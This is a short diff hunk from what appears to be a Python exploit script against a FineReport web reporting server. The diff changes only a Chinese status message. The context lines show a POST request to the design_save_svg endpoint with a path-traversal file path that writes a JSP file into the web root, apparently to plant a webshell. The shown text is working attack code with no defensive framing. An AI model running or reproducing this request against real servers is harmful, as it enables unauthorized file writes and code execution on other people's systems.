@@ -40,7 +40,7 @@ def upload(url,file):
     #print(data)
     try:
         r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp',headers=head,data=dumps(data),proxies=proxy)
-        print('[+] 覆盖文件:',url+'/WebReport/a.svg.jsp')
+        print('[+] 上传文件:',url+'/WebReport/a.svg.jsp')
     except:
         return
 
